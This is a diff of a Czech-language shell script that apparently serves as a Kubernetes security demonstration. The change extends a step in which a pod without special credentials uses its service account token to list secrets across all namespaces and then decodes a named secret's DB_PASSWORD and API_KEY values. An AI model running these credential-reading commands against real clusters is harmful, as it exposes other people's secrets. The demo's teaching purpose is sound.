@@ -32,19 +32,33 @@ say "   Útočník žádné heslo nezná — stačí mu, že je uvnitř kontejne
 echo
 say "2a) Vylistujeme SECRETS napříč VŠEMI namespaces (včetně kube-system):"
 kubectl -n "$NS_INSECURE" exec "$POD" -- sh -c '
-  apk add --no-cache curl >/dev/null 2>&1 || true
+  apk add --no-cache curl jq >/dev/null 2>&1 || true
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
   API=https://kubernetes.default.svc
   echo "   Nalezené secrets (namespace/jméno):"
-  curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
-    "$API/api/v1/secrets" \
-    | grep -oE "\"namespace\":\"[^\"]+\"|\"name\":\"[^\"]+\"" \
-    | paste - - | sed "s/\"namespace\"://; s/\"name\"://; s/\"//g; s/\t/\//" \
-    | head -n 15
-  echo "   ... (zkráceno)"
+  if command -v jq >/dev/null 2>&1; then
+    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" "$API/api/v1/secrets" \
+      | jq -r ".items[] | \"     \(.metadata.namespace)/\(.metadata.name)\""
+  else
+    # fallback bez jq: vytáhne name+namespace z metadata bloků
+    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" "$API/api/v1/secrets" \
+      | tr "," "\n" | grep -E "\"(name|namespace)\":" | sed "s/.*: *//; s/\"//g"
+  fi
+  echo
+  echo "   >>> A rovnou DEŠIFRUJEME konkrétní secret (insecure-demo/app-secrets):"
+  if command -v jq >/dev/null 2>&1; then
+    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
+      "$API/api/v1/namespaces/insecure-demo/secrets/app-secrets" \
+      | jq -r ".data | to_entries[] | \"     \(.key) = \(.value | @base64d)\""
+  else
+    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
+      "$API/api/v1/namespaces/insecure-demo/secrets/app-secrets" \
+      | tr "," "\n" | grep -E "DB_PASSWORD|API_KEY" \
+      | sed "s/.*\"\([A-Z_]*\)\": *\"\([^\"]*\)\".*/     \1 = \2 (base64)/"
+  fi
 '
-bad "Pod bez jakéhokoli hesla přečetl secrets celého clusteru → kompletní únik."
+bad "Pod bez jakéhokoli hesla přečetl a DEŠIFROVAL secrets celého clusteru → kompletní únik."
 pause
 
 echo
